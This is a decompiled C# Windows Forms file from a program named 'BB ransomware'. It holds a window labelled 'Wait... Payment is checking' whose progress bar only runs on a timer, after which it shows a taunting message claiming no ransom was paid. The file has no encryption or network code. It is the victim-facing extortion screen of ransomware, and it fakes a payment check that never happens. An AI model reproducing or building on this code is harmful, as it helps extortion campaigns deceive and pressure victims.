using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace BB_ransomware;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form2()
	{
		((Form)this).add_Load((EventHandler)Form2_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Timer1 = new Timer(components);
		ProgressBar1 = new ProgressBar();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1000);
		((Control)ProgressBar1).set_Location(new Point(12, 39));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(355, 23));
		((Control)ProgressBar1).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(116, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(139, 13));
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Wait... Payment is checking");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(379, 74));
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_Text("BB ransomware");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		ProgressBar1.set_Value(checked(ProgressBar1.get_Value() + 1));
		if (ProgressBar1.get_Value() == 30)
		{
			Timer1.set_Interval(100);
		}
		if (ProgressBar1.get_Value() == 60)
		{
			Timer1.set_Interval(10);
		}
		if (ProgressBar1.get_Value() == 80)
		{
			Timer1.Stop();
			MessageBox.Show("Don't bulshit with me! You don't made a payment", "BB ransomware", (MessageBoxButtons)0);
			((Form)this).Close();
		}
	}
}
